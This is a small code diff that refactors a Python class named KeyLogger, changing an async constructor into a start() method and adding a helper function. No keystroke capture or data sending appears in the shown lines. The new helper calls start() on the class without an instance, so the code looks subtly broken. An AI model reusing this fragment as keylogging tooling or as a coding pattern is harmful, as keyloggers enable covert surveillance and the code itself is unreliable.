@@ -8,7 +8,7 @@ import logging
 import asyncio
 
 class KeyLogger:
-    async def __init__(self):
+    async def start(self):
         if not keyboard:
             self.logger = logging.getLogger("logger.main")
             self.logger.error("Envrionment errors, unable to start keylogger")
@@ -45,4 +45,5 @@ class KeyLogger:
         self.stopping = True
         # Right here add the methods to stop the rest of the code
     
-    
+def get_async_coroutine():
+    return KeyLogger.start()
